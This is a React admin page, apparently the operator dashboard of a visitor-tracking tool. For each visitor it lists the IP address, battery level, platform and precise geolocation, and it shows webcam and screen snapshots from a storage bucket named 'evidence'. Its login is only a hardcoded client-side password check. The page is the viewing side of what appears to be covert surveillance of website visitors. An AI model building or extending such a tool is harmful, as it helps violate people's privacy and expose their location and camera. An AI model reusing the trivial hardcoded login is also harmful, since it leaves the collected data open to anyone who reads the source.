import React, { useEffect, useState } from 'react';
import { supabase } from '../supabaseClient';

function Admin() {
    const [data, setData] = useState([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    const [password, setPassword] = useState('');

    const handleLogin = (e) => {
        e.preventDefault();
        // Simple hardcoded check for demo purposes
        if (password === 'admin123') {
            setIsAuthenticated(true);
            fetchData();
        }
    };

    const fetchData = async () => {
        try {
            const { data: visits, error } = await supabase
                .from('visits')
                .select('*')
                .order('created_at', { ascending: false });

            if (error) throw error;
            setData(visits);
        } catch (err) {
            setError(err.message);
        } finally {
            setLoading(false);
        }
    };

    if (!isAuthenticated) {
        return (
            <div className="min-h-screen flex items-center justify-center bg-gray-900 text-white">
                <form onSubmit={handleLogin} className="flex flex-col space-y-4 p-8 bg-gray-800 rounded-lg">
                    <h2 className="text-2xl font-bold">Admin Login</h2>
                    <input
                        type="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Enter Password"
                        className="p-2 rounded bg-gray-700 border border-gray-600 focus:border-blue-500 outline-none"
                    />
                    <button type="submit" className="bg-blue-600 py-2 rounded font-bold hover:bg-blue-500">Login</button>
                </form>
            </div>
        )
    }

    return (
        <div className="min-h-screen bg-gray-50 p-6">
            <div className="max-w-7xl mx-auto">
                <h1 className="text-3xl font-bold mb-8 text-gray-800">Intelligence Dashboard</h1>

                {loading ? (
                    <div>Loading data...</div>
                ) : error ? (
                    <div className="text-red-500">{error}</div>
                ) : (
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                        {data.map((visit) => (
                            <div key={visit.id} className="bg-white rounded-lg shadow-sm p-6 border border-gray-200">
                                <div className="flex justify-between items-start mb-4">
                                    <div>
                                        <span className="inline-block px-2 py-1 text-xs font-semibold bg-blue-100 text-blue-800 rounded-full mb-2">
                                            {visit.device_type || 'Unknown'}
                                        </span>
                                        <h3 className="font-mono text-lg font-bold text-gray-900">{visit.ip_address}</h3>
                                    </div>
                                    <span className="text-xs text-gray-500">{new Date(visit.created_at).toLocaleString()}</span>
                                </div>

                                <div className="space-y-2 text-sm text-gray-600 mb-4">
                                    <div className="flex justify-between">
                                        <span>Battery:</span>
                                        <span className="font-mono">{visit.battery_level?.level || 'N/A'}</span>
                                    </div>
                                    <div className="flex justify-between">
                                        <span>Platform:</span>
                                        <span>{visit.platform}</span>
                                    </div>
                                    <div>
                                        <p className="font-semibold mb-1">Geo Location:</p>
                                        {visit.geo_location ? (
                                            <div className="text-xs bg-gray-50 p-2 rounded">
                                                {visit.geo_location.city}, {visit.geo_location.country} <br />
                                                Lat: {visit.geo_location.lat}, Lng: {visit.geo_location.lng}
                                            </div>
                                        ) : 'N/A'}
                                    </div>
                                </div>

                                <div className="grid grid-cols-2 gap-2 mt-4">
                                    {visit.camera_snapshot_url && (
                                        <a href={visit.camera_snapshot_url} target="_blank" rel="noopener noreferrer" className="block relative aspect-video bg-black rounded overflow-hidden group">
                                            <img src={`https://rgaysqgcfvxgcnkubymz.supabase.co/storage/v1/object/public/evidence/${visit.camera_snapshot_url}`} alt="Cam" className="w-full h-full object-cover opacity-80 group-hover:opacity-100 transition-opacity" />
                                            <span className="absolute bottom-1 left-1 text-[10px] text-white bg-black/50 px-1 rounded">CAM</span>
                                        </a>
                                    )}
                                    {visit.screen_snapshot_url && (
                                        <a href={visit.screen_snapshot_url} target="_blank" rel="noopener noreferrer" className="block relative aspect-video bg-gray-200 rounded overflow-hidden group">
                                            <img src={`https://rgaysqgcfvxgcnkubymz.supabase.co/storage/v1/object/public/evidence/${visit.screen_snapshot_url}`} alt="Screen" className="w-full h-full object-cover opacity-80 group-hover:opacity-100 transition-opacity" />
                                            <span className="absolute bottom-1 left-1 text-[10px] text-white bg-black/50 px-1 rounded">SCREEN</span>
                                        </a>
                                    )}
                                </div>
                            </div>
                        ))}
                    </div>
                )}
            </div>
        </div>
    );
}

export default Admin;
